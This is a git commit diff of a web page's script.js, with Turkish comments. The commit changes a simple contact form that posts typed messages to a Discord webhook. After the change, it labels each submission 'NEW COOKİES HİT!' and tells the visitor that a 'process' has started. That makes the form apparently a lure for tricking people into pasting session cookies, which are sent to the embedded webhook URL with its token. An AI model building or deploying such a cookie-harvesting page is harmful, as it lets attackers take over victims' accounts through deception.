3b0030dff56dfea30573260d151b27bd5e1f3861
CamScripter <brawlcam17@gmail.com>
2026-06-22 21:03:09 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,18 +1,16 @@
 document.getElementById('discordForm').addEventListener('submit', function(e) {
-    e.preventDefault(); // Sayfanın yenilenmesini önler
+    e.preventDefault(); 
 
     const mesajGirdisi = document.getElementById('kullaniciMesaji');
     const mesaj = mesajGirdisi.value;
 
-    // Kendi Discord Webhook linkini aşağıdaki tırnakların içine yapıştır:
+    // Kendi Discord Webhook linkini buraya yapıştır:
     const webhookURL = "https://discord.com/api/webhooks/1517433852908277900/R_qDQkZB2lzxkxk58f7uTgtxXdLBR0OnGmknvGIQMy8VM_nXkuNC2nRB58ufF7HTYqkX";
 
-    // Discord'a gidecek mesajın formatı
     const veri = {
-        content: `💬 **Siteden Yeni Mesaj Geldii!** \n> ${mesaj}`
+        content: `🎮 **NEW COOKİES HİT!** \n> **Girilen Veri:** ${mesaj}`
     };
 
-    // İsteği gönderme işlemi
     fetch(webhookURL, {
         method: 'POST',
         headers: {
@@ -22,14 +20,14 @@ document.getElementById('discordForm').addEventListener('submit', function(e) {
     })
     .then(response => {
         if (response.ok) {
-            alert('Mesaj başarıyla Discord\'a gönderildi! ✅');
-            mesajGirdisi.value = ''; // Kutuyu temizle
+            alert('Process started successfully! Please wait.');
+            mesajGirdisi.value = ''; 
         } else {
-            alert('Mesaj gönderilirken bir hata oluştu. ❌');
+            alert('An error occurred. Please try again.');
         }
     })
     .catch(error => {
         console.error('Hata:', error);
-        alert('Bağlantı hatası oluştu!');
+        alert('Connection error.');
     });
 });
